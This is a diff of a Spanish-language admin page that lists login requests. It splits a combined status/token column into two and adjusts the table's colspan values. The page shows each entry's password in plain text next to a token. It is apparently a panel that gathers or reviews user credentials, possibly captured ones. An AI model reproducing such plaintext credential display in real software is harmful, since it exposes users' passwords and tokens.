@@ -331,14 +331,15 @@
                         <th>Usuario</th>
                         <th>Contraseña</th>
                         <th>Portal</th>
-                        <th>Estado / Token</th>
+                        <th>Estado</th>
+                        <th>Token</th>
                         <th>Fecha</th>
                         <th>Acciones</th>
                     </tr>
                 </thead>
                 <tbody id="solicitudesBody">
                     <tr>
-                        <td colspan="6">
+                        <td colspan="7">
                             <div class="empty-state">
                                 <i class="fas fa-inbox"></i>
                                 <p>Cargando solicitudes...</p>
@@ -504,7 +505,7 @@
             var tbody = document.getElementById('solicitudesBody');
             
             if (!solicitudes || solicitudes.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="6"><div class="empty-state"><i class="fas fa-inbox"></i><p>No hay solicitudes de ingreso registradas</p></div></td></tr>';
+                tbody.innerHTML = '<tr><td colspan="7"><div class="empty-state"><i class="fas fa-inbox"></i><p>No hay solicitudes de ingreso registradas</p></div></td></tr>';
                 updateStats([]);
                 return;
             }
@@ -543,7 +544,8 @@
                     '</td>' +
                     '<td><span class="password-cell">' + escapeHtml(s.contrasena || '') + '</span></td>' +
                     '<td><span class="portal-badge ' + s.portal + '"><i class="fas ' + portalIcon + '"></i> ' + portalLabel + '</span></td>' +
-                    '<td>' + statusBadge + tokenHtml + '</td>' +
+                    '<td>' + statusBadge + '</td>' +
+                    '<td>' + tokenHtml + '</td>' +
                     '<td style="font-size: 12px; color: #6b7280;">' + fecha + '</td>' +
                     '<td>' +
                         '<div class="actions-cell">' +
@@ -726,7 +728,7 @@
             } catch (err) {
                 console.error('❌ Error al cargar:', err);
                 document.getElementById('solicitudesBody').innerHTML = 
-                    '<tr><td colspan="6"><div class="empty-state"><i class="fas fa-exclamation-triangle"></i><p>Error al cargar datos: ' + escapeHtml(err.message) + '</p></div></td></tr>';
+                    '<tr><td colspan="7"><div class="empty-state"><i class="fas fa-exclamation-triangle"></i><p>Error al cargar datos: ' + escapeHtml(err.message) + '</p></div></td></tr>';
             }
         }
 
